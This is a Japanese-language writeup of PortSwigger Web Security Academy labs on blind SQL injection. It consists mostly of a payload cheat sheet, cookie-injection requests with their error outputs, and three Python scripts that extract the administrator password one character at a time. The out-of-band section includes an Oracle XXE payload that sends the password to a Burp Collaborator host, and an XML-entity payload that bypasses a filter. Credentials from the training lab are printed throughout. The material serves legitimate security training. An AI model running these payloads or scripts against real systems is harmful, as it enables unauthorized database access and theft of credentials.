---
title: 'BlindBasedSQLi - PortSwigger'
description: 'PortSwiggerのSQLi-Blindについて'
pubDate: 2026-01-08
category: 'PortSwigger'
tags: ['PortSwigger', 'Writeup', 'Web', 'SQLi', 'Blind']
---

# BlindBasedSQLi - PortSwigger

## ペイロード一覧 (Lab内で使用したもの)
### Responses
- Po
  - `correct' and 'a'='a`
    - Blindの正誤を画面や処理の変化をよく観察
  - `correct' and (select 'a' from users limit 1)='a`
    - 特定のTableが存在するか、Dataが1行以上存在するか
    - limit1をつけないと行の数だけa(条件一致)を返してくるからサブクエリ(値は1つ)がこわれる
  - `correct' and (select 'a' from users where user='admin')='a`
    - adminが存在するか
  - `correct' and (select 'a' from users where user='admin' and length(pass)>1)='a`
    - adminが存在しかつpassが2文字以上
  - `correct' and (select substring(pass,1,1) from users where user='admin')='a`
    - passの1文字目が a なら True (pass,何文字目,何文字取る)
### Errors
- Or
  - `'||(select '')||'`
  - `'||(select '' from dual)||'`
    - Errorになるか確認する
  - `'||(select '' from users where rownum = 1)||'`
    - 特定のTableが存在するか、Dataが1行以上存在するか(limitと同様)
  - `'||(select case when (1=1) then to_char(1/0) else '' END from dual)||'`
    - 条件付きのエラー
  - `'||(select case when (1=1) then to_char(1/0) else '' end from users where username='admin')||'`
    - users テーブルに username='admin' という行が存在するか
  - `'||(SELECT CASE WHEN LENGTH(password)>20 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    - adminが存在しかつpassが2文字以上
  - `'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    - passの1文字目が a なら True (pass,何文字目,何文字取る)
  - `'||pg_sleep(10)--`
    - Time base
- Po
  - `correct' and cast((select 1) as int)--`
    - "correct and 1"になりMyやPoはintで比較できない、boolean"1=1"で返さないとerrorになる
  - `correct' and 1=cast((select username from users) as int)--`
    - サブクエリは1行のみ返すようにしないとerrorになる
  - `correct' and 1=cast((select username from users limit 1) as int)--`
    - castがusernameをintにしようとして失敗した結果としてusernameを出力する
  - `correct' and 1=cast((select password from users limit 1) as int)--`
    - 上記と同様
### Time
- Po
  - `'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
  - `'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
  - `'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
  - `'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
### Out of band
- Po
  - `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
  - `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
### XML
- `<storeId>1 UNION SELECT NULL</storeId>`
- `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>`

## Lab
### Blind SQL injection with conditional responses
```text
Cookie: TrackingId=0Cje9BEZNaJ8ceaY'+and+'a'%3d'a

Cookie: TrackingId=0Cje9BEZNaJ8ceaY'+and+(select+'a'+from+users+where+username%3d'administrator'+and+length(password)>19)%3d'a;
```
**Cracking**
```py
import requests

URL = "https://challenge-host/"
s = requests.Session()

req = s.get(URL)

id = s.cookies.get("TrackingId")
char = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

for i in range(1,21):
  for j in range(len(char)):
    s.cookies.set(
      "TrackingId",
      f"{id}' and (select substring(password,{i},1) from users where username='administrator')='{char[j]}",
      domain="0a93006d04513c9d8096268d007b00c4.web-security-academy.net",
      path="/"
    )

    # print(s.cookies.get("TrackingId"))

    req = s.get(URL)
    # print(len(req.content))
    if len(req.content) >= 11455:
      # print(char[j], end="", flush=True)
      password += char[j]

print(password) # bejpg0eorlcewhfelodg
```

### Blind SQL injection with conditional errors
```text
Cookie: TrackingId=j5HKHI8goEsdg9Or'||(select '' from a)||';  
- error

Cookie: TrackingId=j5HKHI8goEsdg9Or'||(select '' from users where rownum = 1)||';

Cookie: TrackingId=j5HKHI8goEsdg9Or'||(SELECT CASE WHEN LENGTH(password)>19 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||';
```
**Cracking**
```py
import requests

URL = "https://challenge-host/"
s = requests.Session()

req = s.get(URL)

id = s.cookies.get("TrackingId")
char = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

for i in range(1,21):
  for j in range(len(char)):
    s.cookies.set(
      "TrackingId",
      f"{id}'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{char[j]}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
      domain="0a95007a0385470f80b42b83006900ff.web-security-academy.net",
      path="/"
    )

    # print(s.cookies.get("TrackingId"))

    req = s.get(URL)
    # print(len(req.content))
    if len(req.content) < 11401:
      # print(char[j], end="", flush=True)
      password += char[j]

# print(password) # 2vu7m5m8k2oz7bxiyats
```

### Visible error-based SQL injection
```text
Cookie: TrackingId=70KX4FppgtRdGa9c' and 1=cast((select version()) as int)--  
- ERROR: invalid input syntax for type integer: "PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit"

Cookie: TrackingId=70KX4FppgtRdGa9c' and cast((select 1) as int)--  
- ERROR: argument of AND must be type boolean, not type integer

Cookie: TrackingId=70KX4FppgtRdGa9c' and 1=cast((select username from users) as int)--  
- Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = '70KX4FppgtRdGa9c' and 1=cast((select username from users) as'. Expected  char

<!-- asで文字が切られる   -->
<!-- 文字数制限がかかっているので先頭のIDを削除してコメントアウトまで挿入できるようにする必要がある -->

Cookie: TrackingId=' and 1=cast((select username from users) as int)--  
- ERROR: more than one row returned by a subquery used as an expression

Cookie: TrackingId=' and 1=cast((select username from users limit 1) as int)--  
- ERROR: invalid input syntax for type integer: "administrator"

Cookie: TrackingId=' and 1=cast((select password from users limit 1) as int)--  
- ERROR: invalid input syntax for type integer: "7hmvfde0yd6pgqe2vin2"
```

### Blind SQL injection with time delays
```text
Cookie: TrackingId=9QeSDW3iWFdUwotl'||pg_sleep(10)--;
```

### Blind SQL injection with time delays and information retrieval
```text
Cookie: TrackingId=kJ6x8ea2ZtAGQLEX'%3b+select+case+when+(1%3d1)+then+pg_sleep(10)+else+pg_sleep(0)+end--;

Cookie: TrackingId=kJ6x8ea2ZtAGQLEX'%3b+select+case+when+(username%3d'administrator')+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users--;

Cookie: TrackingId=kJ6x8ea2ZtAGQLEX'%3b+select+case+when+(username%3d'administrator'+and+length(password)>19)+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users--;
```
**Cracking**
```py
import requests

URL = "https://challenge-host/"
s = requests.Session()

req = s.get(URL)

id = s.cookies.get("TrackingId")
char = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

for i in range(1,21):
  for j in range(len(char)):
    s.cookies.set(
      "TrackingId",
      f"{id}'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i},1)='{char[j]}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--",
      domain="0a0200ec048987d980fa4e29000f0059.web-security-academy.net",
      path="/"
    )

    # print(s.cookies.get("TrackingId"))

    req = s.get(URL)
    # print(len(req.content))
    if req.elapsed.total_seconds() > 9:
      # print(char[j], end="", flush=True)
      password += char[j]

print(password) # 03xj5uv9o4e5sdcet7kp
```

### Blind SQL injection with out-of-band interaction
> Firewallで制限されていて、BurpProのCollaboratorのドメインのみ有効なためパス

### Blind SQL injection with out-of-band data exfiltration
> Firewallで制限されていて、BurpProのCollaboratorのドメインのみ有効なためパス

### SQL injection with filter bypass via XML encoding
```xml
<!-- HackvertorのURLencode -->
<storeId>
  1%20union%20select%20null
</storeId>
- 0 units

<!-- Hackvertorの<@hex_entities>(HTML 16進エンティティ化) -->
<storeId>
&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x7e;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;
</storeId>
-
  wiener~98q0lhouowyc9pi3k0k3
  carlos~371loj249398f2gn1mli
  718 units
  administrator~lgu8qcmgl0gnyrqdgp4r
```